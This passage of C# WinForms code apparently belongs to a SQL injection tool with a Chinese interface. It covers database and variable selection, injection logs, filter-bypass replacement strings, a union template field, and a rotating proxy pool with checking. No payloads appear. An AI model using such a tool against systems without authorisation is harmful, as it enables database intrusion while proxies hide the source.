        private void data_dbs_tsmi_selectAllSubNode_Click(object sender, EventArgs e)
        {
            SelectAllNodes(this.data_tvw_dbs);
        }

        private void SelectReversNodes(TreeView tvw)
        {
            TreeNode tn = tvw.SelectedNode;
            if (tn != null)
            {
                tn.Checked = true;
                foreach (TreeNode stn in this.data_tvw_dbs.SelectedNode.Nodes)
                {
                    if (!stn.Checked)
                    {
                        stn.Checked = true;
                    }
                    else
                    {
                        stn.Checked = false;
                    }
                }
            }
        }

        private void SelectAllNodes(TreeView tvw)
        {
            TreeNode tn = this.data_tvw_dbs.SelectedNode;
            if (tn != null)
            {
                tn.Checked = true;
                foreach (TreeNode stn in this.data_tvw_dbs.SelectedNode.Nodes)
                {
                    if (!stn.Checked)
                    {
                        stn.Checked = true;
                    }
                }
            }
        }

        private void SelectReversNodes(ListView lvw)
        {
            ListViewItemCollection lvl = lvw.Items;
            if (lvl != null && lvl.Count > 0)
            {

                foreach (ListViewItem lvi in lvl)
                {
                    if (lvi.Checked)
                    {
                        lvi.Checked = false;
                    }
                    else
                    {
                        lvi.Checked = true;
                    }
                }
            }
        }

        private void SelectAllNodes(ListView lvw)
        {
            ListViewItemCollection lvl = lvw.Items;
            if (lvl != null && lvl.Count > 0)
            {
                foreach (ListViewItem lvi in lvl)
                {
                    if (!lvi.Checked)
                    {
                        lvi.Checked = true;
                    }
                }
            }
        }

        private void data_dbs_tsmi_selectReversSubNode_Click(object sender, EventArgs e)
        {
            SelectReversNodes(this.data_tvw_dbs);
        }

        private void tsmi_injectLog_clearAllLog_Click(object sender, EventArgs e)
        {
            this.lvw_injectLog.Items.Clear();
            Tools.delAllFiles(AppDomain.CurrentDomain.BaseDirectory + "/logs/injection/");
            MessageBox.Show("记录已经清空！");
        }

        private void tsmi_injectLog_useCLog_Click(object sender, EventArgs e)
        {
            if (this.lvw_injectLog.SelectedItems.Count > 0)
            {
                try
                {
                    this.config = XML.readConfig(this.lvw_injectLog.SelectedItems[0].Tag.ToString());
                    reloadConfig(this.config);
                    MessageBox.Show("加载注入记录成功！");
                }
                catch (Exception ep)
                {
                    log("加载注入记录失败！--" + ep.Message, LogLevel.waring);
                }
            }
        }

        private void tsmi_injectLog_delSLog_Click(object sender, EventArgs e)
        {
            if (this.lvw_injectLog.SelectedItems.Count > 0)
            {
                try
                {
                    foreach (ListViewItem lvw in this.lvw_injectLog.SelectedItems)
                    {
                        Tools.delFile(lvw.Tag.ToString());
                    }
                    this.lvw_injectLog.Items.Remove(this.lvw_injectLog.SelectedItems[0]);
                    MessageBox.Show("删除选择记录成功！");
                }
                catch (Exception ep)
                {
                    log("删除选择记录失败！--" + ep.Message, LogLevel.waring);
                }
            }
        }

        private void cmd_btn_stop_Click(object sender, EventArgs e)
        {
            if (status != 0)
            {
                StopThread();
                this.cmd_btn_start.Enabled = true;
            }
        }

        private void file_btn_stop_Click(object sender, EventArgs e)
        {
            if (status != 0)
            {

                StopThread();
                this.file_btn_start.Enabled = true;
            }

        }

        private void data_cms_copyPaylaod_Click(object sender, EventArgs e)
        {

            try
            {
                if (this.log_lvw_httpLog.SelectedItems.Count == 0)
                {
                    return;
                }
                String text = this.log_lvw_httpLog.SelectedItems[0].SubItems[1].Text;
                Clipboard.SetText(text);
                MessageBox.Show("复制成功！");
            }
            catch
            {
                MessageBox.Show("复制失败，可能粘贴板被其他软件占用！");
            }

        }

        private void bypass_tsmi_delselect_Click(object sender, EventArgs e)
        {
            if (this.bypass_lvw_replaceString.SelectedItems != null && this.bypass_lvw_replaceString.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvi in this.bypass_lvw_replaceString.SelectedItems)
                {

                    this.bypass_lvw_replaceString.Items.Remove(lvi);
                    String delStr = lvi.SubItems[0].Text + "\t" + lvi.SubItems[1].Text + "\n";
                    config.replaceStrs = config.replaceStrs.Replace(delStr, "");
                    replaceList.Remove(lvi.SubItems[0].Text);

                }
            }
            else
            {
                MessageBox.Show("没有选择！");
            }
        }

        private void bypass_tsmi_copy_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.bypass_lvw_replaceString.SelectedItems.Count <= 0)
                {
                    return;
                }
                Clipboard.SetText(this.bypass_lvw_replaceString.SelectedItems[0].SubItems[0].Text + "\t" + this.bypass_lvw_replaceString.SelectedItems[0].SubItems[1].Text);
                MessageBox.Show("复制成功！");
            }
            catch
            {
                MessageBox.Show("复制失败，可能粘贴板被其他软件占用！");
            }

        }

        private void txt_inject_unionTemplate_TextChanged(object sender, EventArgs e)
        {
            config.unionFillTemplate = this.txt_inject_unionTemplate.Text;
        }

        private void data_cms_tsmi_selectAllVers_Click(object sender, EventArgs e)
        {
            SelectAllNodes(this.data_lvw_ver);
        }

        private void data_cms_tsmi_selectReversVers_Click(object sender, EventArgs e)
        {
            SelectReversNodes(this.data_lvw_ver);
        }

        private void proxy_btn_addProxy_Click(object sender, EventArgs e)
        {
            if (loadProxyList != 1)
            {
                MessageBox.Show("请稍后，正在加载上一次设置的代理池！");
                return;
            }
            String host = this.proxy_txt_addProxyHost.Text;
            int port = Tools.convertToInt(this.proxy_txt_addProxyPort.Text);
            if (!StringTools.CheckIsDomainOrIP(host))
            {
                MessageBox.Show("代理IP未填写或格式错误！");
                return;
            }
            if (port <= 0 || port > 65535)
            {
                MessageBox.Show("代理端口未填写或格式错误！");
                return;
            }
            String key = host + port;
            if (proxy_List.ContainsKey(key))
            {
                MessageBox.Show("代理已经存在，不能重复添加！");
                return;
            }

            Proxy proxy = new Proxy();
            proxy.host = host;
            proxy.port = port;
            proxy.proxyType = this.proxy_txt_addProxyType.Text;
            proxy.username = this.proxy_txt_addProxyUserName.Text;
            proxy.password = this.proxy_txt_addProxyPassword.Text;
            proxy.proxyType = this.proxy_txt_addProxyType.Text;
            addItemsToProxy_lvw(proxy);
        }

        private delegate void DelegateAddItemToProxy(Proxy proxy);
        private void addItemsToProxy_lvw(Proxy proxy)
        {

            String key = proxy.host + proxy.port;
            ListViewItem lvi = new ListViewItem(proxy.host);
            lvi.Tag = key;
            lvi.SubItems.Add(proxy.port.ToString());
            lvi.SubItems.Add(proxy.proxyType);
            lvi.SubItems.Add(proxy.username);
            lvi.SubItems.Add(proxy.password);
            lvi.SubItems.Add(proxy.isOk);
            lvi.SubItems.Add(proxy.useTime.ToString());
            lvi.SubItems.Add(proxy.checkTime);
            if ("是".Equals(proxy.isOk))
            {
                lvi.ForeColor = Color.Green;
            }
            else if ("否".Equals(proxy.isOk))
            {
                lvi.ForeColor = Color.Red;
            }
            this.proxy_lvw_proxyList.Items.Add(lvi);
            if (!proxy_List.ContainsKey(key))
            {
                proxy_List.Add(key, proxy);
            }

        }

        private void proxy_delSelectedProxy_Click(object sender, EventArgs e)
        {
            if (this.proxy_lvw_proxyList.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvi in this.proxy_lvw_proxyList.SelectedItems)
                {
                    String key = lvi.Tag.ToString();
                    if (this.proxy_List.ContainsKey(key))
                    {
                        this.proxy_List.Remove(key);
                    }
                    this.proxy_lvw_proxyList.Items.Remove(lvi);
                }

                MessageBox.Show("删除成功！");
            }
        }

        private void proxy_tsmi_setCurrentProxy_Click(object sender, EventArgs e)
        {
            if (this.proxy_lvw_proxyList.SelectedItems.Count > 0)
            {
                Proxy proxy = new Proxy();
                proxy.host = this.proxy_lvw_proxyList.SelectedItems[0].SubItems[0].Text;
                proxy.port = int.Parse(this.proxy_lvw_proxyList.SelectedItems[0].SubItems[1].Text);
                proxy.proxyType = this.proxy_lvw_proxyList.SelectedItems[0].SubItems[2].Text;
                proxy.username = this.proxy_lvw_proxyList.SelectedItems[0].SubItems[3].Text;
                proxy.password = this.proxy_lvw_proxyList.SelectedItems[0].SubItems[4].Text;
                proxy.isOk = this.proxy_lvw_proxyList.SelectedItems[0].SubItems[5].Text;
                proxy.useTime = Tools.convertToInt(this.proxy_lvw_proxyList.SelectedItems[0].SubItems[6].Text);
                if (this.proxy_cmb_proxyMode.SelectedIndex != 2)
                {
                    this.proxy_cmb_proxyMode.SelectedIndex = 2;
                }
                this.proxy_lbl_proxy_host.Text = proxy.host;
                this.proxy_lbl_proxy_port.Text = proxy.port.ToString();
                this.proxy_lbl_proxyType.Text = proxy.proxyType;
                this.proxy_lbl_proxy_username.Text = proxy.username;
                this.proxy_lbl_proxy_password.Text = proxy.password;
                this.proxy = proxy;
                MessageBox.Show("选择代理成功！");
            }
        }

        private void proxy_cmb_proxyMode_TextChanged(object sender, EventArgs e)
        {
            config.proxy_mode = this.proxy_cmb_proxyMode.SelectedIndex;
            if (config.proxy_mode == 1)
            {
                if (this.proxy_List.Count <= 0)
                {
                    MessageBox.Show("选择随机代理，但是目前代理池没有代理资源，请添加代理资源，才能生效！");
                }
            }
            else if (config.proxy_mode == 2)
            {
                if (String.IsNullOrEmpty(this.proxy.host) || this.proxy.port <= 0)
                {
                    //固定代理
                    MessageBox.Show("请在代理池中选择固定代理！");
                }

            }
        }

        private void proxy_clearAllProxy_Click(object sender, EventArgs e)
        {
            this.proxy_List.Clear();
            this.proxy_lvw_proxyList.Items.Clear();
            MessageBox.Show("代理池已经清空！");
        }

        private void proxy_copySelectedProxy_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.proxy_lvw_proxyList.SelectedItems.Count > 0)
                {
                    StringBuilder sb = new StringBuilder();

                    for (int i = 0; i < this.proxy_lvw_proxyList.SelectedItems[0].SubItems.Count; i++)
                    {
                        sb.Append(this.proxy_lvw_proxyList.SelectedItems[0].SubItems[i].Text + "\t");
                    }
                    if (sb.Length > 1)
                    {
                        sb.Remove(sb.Length - 1, 1);
                    }
                    Clipboard.SetText(sb.ToString());
                    MessageBox.Show("复制成功！");
                }
            }
            catch
            {
                MessageBox.Show("复制失败，可能粘贴板被其他软件占用！");
            }


        }


        private void loadAddProxyList(Object path)
        {

            Dictionary<String, Proxy> list = FileTool.ReadProxyList(path.ToString());
            int i = 0;
            foreach (String key in list.Keys)
            {
                if (!this.proxy_List.ContainsKey(key))
                {

                    Proxy cproxy = null;
                    bool istrue = list.TryGetValue(key, out cproxy);
                    if (istrue && cproxy != null)
                    {
                        i++;
                        this.proxy_lvw_proxyList.Invoke(new DelegateAddItemToProxy(addItemsToProxy_lvw), cproxy);
                    }
                }
            }
            this.proxy_btn_importProxy.Enabled = true;
            this.txt_log.Invoke(new showLogDelegate(log), "导入代理成功，发现代理：" + i + "个！", LogLevel.success);

        }
        private void load_proxy()
        {

            OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.csv)|*.csv" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                Thread th = new Thread(new ParameterizedThreadStart(loadAddProxyList));
                this.proxy_btn_importProxy.Enabled = false;
                th.Start(ofd.FileName);

            }

        }
        private void proxy_btn_importProxy_Click(object sender, EventArgs e)
        {
            load_proxy();
        }

        private void checkOneProxy(ListViewItem lvi)
        {

            Proxy proxy = null;
            bool isok = this.proxy_List.TryGetValue(lvi.Tag.ToString(), out proxy);
            if (proxy != null && isok)
            {
                bool istrue = false;
                if ("Socks5".Equals(proxy.proxyType))
                {
                    SocketProxy sp = new SocketProxy();
                    TcpClient client = sp.creatProxySocket(proxy.host, proxy.port, config.timeOut);
                    if (client != null)
                    {
                        try
                        {
                            istrue = sp.ConnectProxyServer(config.proxy_check_host, config.proxy_check_port, client, proxy.username, proxy.password, config.timeOut);
                            proxy.useTime = sp.ConectProxyUseTime;
                        }
                        catch (Exception e)
                        {
                            this.txt_log.Invoke(new showLogDelegate(log), "验证代理发生异常！" + e.Message, LogLevel.waring);
                        }
                        finally
                        {
                            client.Close();
                        }

                    }
                }
                else
                {
                    istrue = HttpProxy.checkConnection(config, proxy);
                    proxy.useTime = HttpProxy.ConectProxyUseTime;
                }
                proxy.checkTime = DateTime.Now.ToString();
                if (istrue)
                {
                    proxy.isOk = "是";
                    lvi.ForeColor = Color.Green;
                }
                else
                {
                    proxy.isOk = "否";
                    lvi.ForeColor = Color.Red;
                }
                lvi.SubItems[5].Text = proxy.isOk;
                lvi.SubItems[6].Text = proxy.useTime.ToString();
                lvi.SubItems[7].Text = proxy.checkTime;
            }
        }

        private void checkSelectProxy(Object obj)
        {
            this.checkProxyStatus = 1;
            SelectedListViewItemCollection list = (SelectedListViewItemCollection)obj;
            if (list.Count > 0)
            {
                foreach (ListViewItem lvi in list)
                {
                    checkOneProxy(lvi);
                }
            }
            this.checkProxyStatus = 0;
        }

        private void checkAllProxy(Object obj)
        {
            this.checkProxyStatus = 1;
            ListViewItemCollection list = (ListViewItemCollection)obj;
            if (list.Count > 0)
            {
                foreach (ListViewItem lvi in list)
                {
                    checkOneProxy(lvi);
                }
            }
            this.checkProxyStatus = 0;
        }

        private void checkNoCheckProxy(Object obj)
        {
            this.checkProxyStatus = 1;
            ListViewItemCollection list = (ListViewItemCollection)obj;
            if (list.Count > 0)
            {
                foreach (ListViewItem lvi in list)
                {
                    if ("未验证".Equals(lvi.SubItems[5].Text))
                    {

                        checkOneProxy(lvi);
                    }
                }
            }
            this.checkProxyStatus = 0;
        }

        private void proxy_checkSelectedProxy_Click(object sender, EventArgs e)
        {
            if (this.checkProxyStatus == 0)
            {
                if (String.IsNullOrEmpty(config.proxy_check_host) || config.proxy_check_port <= 0)
                {
                    MessageBox.Show("代理验证域名端口设置错误，请在系统设置中更正！");
                    return;
                }
                Thread t = new Thread(new ParameterizedThreadStart(checkSelectProxy));
                t.Start(this.proxy_lvw_proxyList.SelectedItems);
            }
            else
            {
                MessageBox.Show("上一次验证还未结束，请稍后再试！");
            }

        }

        private void proxy_importProxy_Click(object sender, EventArgs e)
        {
            load_proxy();
        }

        private void proxy_checkAllProxy_Click(object sender, EventArgs e)
        {
            if (this.checkProxyStatus == 0)
            {
                if (String.IsNullOrEmpty(config.proxy_check_host) || config.proxy_check_port <= 0)
                {
                    MessageBox.Show("代理验证域名端口设置错误，请在系统设置中更正！");
                    return;
                }
                Thread t = new Thread(new ParameterizedThreadStart(checkAllProxy));
                t.Start(this.proxy_lvw_proxyList.Items);
            }
            else
            {
                MessageBox.Show("上一次验证还未结束，请稍后再试！");
            }
        }
        private void clearAllFailedProxy()
        {

            if (this.proxy_lvw_proxyList.Items.Count > 0)
            {
                foreach (ListViewItem lvi in this.proxy_lvw_proxyList.Items)
                {
                    String isok = lvi.SubItems[5].Text;
                    String key = lvi.Tag.ToString();
                    if ("否".Equals(isok))
                    {
                        if (this.proxy_List.ContainsKey(key))
                        {
                            this.proxy_List.Remove(key);
                        }
                        this.proxy_lvw_proxyList.Items.Remove(lvi);
                    }
                }
                MessageBox.Show("清除无效代理成功！");
            }
        }
        private void proxy_clearAllFailedProxy_Click(object sender, EventArgs e)
        {
            clearAllFailedProxy();
        }

        private void proxy_ts_btn_clearAllFailedProxy_Click(object sender, EventArgs e)
        {
            clearAllFailedProxy();
        }

        private void proxy_exportProxy_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "文本文件|*.csv";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                FileTool.SaveProxyList(saveFileDialog.FileName, this.proxy_List.Values);
                MessageBox.Show("导出代理池成功！");
            }
        }

        private void checkNoCheckProxy()
        {

            if (this.checkProxyStatus == 0)
            {
                if (String.IsNullOrEmpty(config.proxy_check_host) || config.proxy_check_port <= 0)
                {
                    MessageBox.Show("代理验证域名端口设置错误，请在系统设置中更正！");
                    return;
                }
                Thread t = new Thread(new ParameterizedThreadStart(checkNoCheckProxy));
                t.Start(this.proxy_lvw_proxyList.Items);
            }
            else
            {
                MessageBox.Show("上一次验证还未结束，请稍后再试！");
            }
        }

        private void proxy_checkNoCheckProxy_Click(object sender, EventArgs e)
        {
            checkNoCheckProxy();
        }

        private void proxy_ts_btn_proxy_checkNoCheckProxy_Click(object sender, EventArgs e)
        {
            checkNoCheckProxy();
        }

        private void Main_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.All;
            }
            else
            {
                e.Effect = DragDropEffects.None;
            }

        }

        private void Main_DragDrop(object sender, DragEventArgs e)
        {
            String path = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
            this.config = XML.readConfig(path);
            reloadConfig(this.config);
            MessageBox.Show("导入配置成功！");
        }

        private void toolStrip_vers_btn_getVariable_Click(object sender, EventArgs e)
        {
            getVariable();
        }

        private void toolStrip_vers_btn_stopGetVariable_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void data_dbs_tsl_stopGetDatas_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void btn_stop_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void toolStrip_vers_btn_selectAll_Click(object sender, EventArgs e)
        {
            SelectAllNodes(this.data_lvw_ver);
        }

        private void toolStrip_vers_btn_selectReverse_Click(object sender, EventArgs e)
        {
            SelectReversNodes(this.data_lvw_ver);
        }
    } 
    
}